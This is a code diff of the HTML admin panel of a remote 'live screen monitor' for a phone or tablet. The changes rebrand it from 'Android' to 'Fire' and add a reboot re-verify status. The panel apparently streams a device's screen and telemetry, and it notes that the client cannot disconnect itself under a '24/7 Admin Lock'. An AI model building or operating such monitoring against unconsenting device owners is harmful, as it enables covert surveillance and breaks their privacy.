@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Android Live Screen Monitor - Admin Panel</title>
+  <title>Fire Live Screen Monitor - Admin Panel</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
@@ -31,8 +31,8 @@
   <!-- Left Vertical Navigation Sidebar -->
   <aside class="w-16 bg-[#080e1e] border-r border-slate-800/80 flex flex-col items-center py-4 justify-between shrink-0">
     <div class="flex flex-col items-center gap-6">
-      <div class="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-xl">
-        <i class="fa-brands fa-android"></i>
+      <div class="w-10 h-10 rounded-xl bg-orange-500/10 border border-orange-500/30 flex items-center justify-center text-orange-400 text-xl">
+        <i class="fa-solid fa-fire"></i>
       </div>
       <nav class="flex flex-col gap-4 text-slate-400">
         <button title="Dashboard" class="w-10 h-10 rounded-lg bg-blue-600/20 text-blue-400 border border-blue-500/40 flex items-center justify-center">
@@ -67,7 +67,7 @@
       <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
         <div class="flex items-center gap-3">
           <h1 class="text-lg md:text-xl font-bold tracking-wide text-cyan-400">
-            ANDROID LIVE SCREEN MONITOR
+            FIRE LIVE SCREEN MONITOR
           </h1>
           <span id="connBadge" class="text-xs px-3 py-1 rounded-full bg-amber-500/20 border border-amber-500/40 text-amber-300 font-medium">
             Initializing Channel...
@@ -318,7 +318,7 @@
           <div id="eventLogBox"
             class="flex-1 bg-[#050811] border border-slate-800 rounded-xl p-2.5 font-mono text-[11px] text-emerald-400 overflow-y-auto max-h-56 space-y-1">
             <div class="text-slate-500">[SYSTEM] Pre-configured Supabase loaded.</div>
-            <div class="text-slate-500">[LOCK] Client self-disconnect disabled.</div>
+            <div class="text-slate-500">[LOCK] Fire app self-disconnect disabled.</div>
           </div>
         </div>
 
@@ -461,8 +461,13 @@
         })
         .on('broadcast', { event: 'device-telemetry' }, ({ payload }) => {
           const onlineTag = document.getElementById('deviceOnlineTag');
-          onlineTag.textContent = 'Device Status: Online (Admin Locked)';
-          onlineTag.className = 'text-xs px-3 py-1 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300';
+          if (payload.needsReverify) {
+            onlineTag.textContent = 'Fire Status: Needs Re-verify (Rebooted)';
+            onlineTag.className = 'text-xs px-3 py-1 rounded-full bg-amber-500/20 border border-amber-500/40 text-amber-300';
+          } else {
+            onlineTag.textContent = 'Fire Status: Online (24/7 Admin Lock)';
+            onlineTag.className = 'text-xs px-3 py-1 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300';
+          }
 
           if (payload.model) document.getElementById('statModel').textContent = payload.model;
           if (payload.os) document.getElementById('statOs').textContent = payload.os;
@@ -522,7 +527,7 @@
       canvas.height = video.videoHeight || 1280;
       canvas.getContext('2d').drawImage(video, 0, 0);
       const link = document.createElement('a');
-      link.download = `screen_${Date.now()}.png`;
+      link.download = `fire_screen_${Date.now()}.png`;
       link.href = canvas.toDataURL('image/png');
       link.click();
       addLog('SCREENSHOT_SAVED: Downloaded PNG snapshot.', 'text-blue-400');
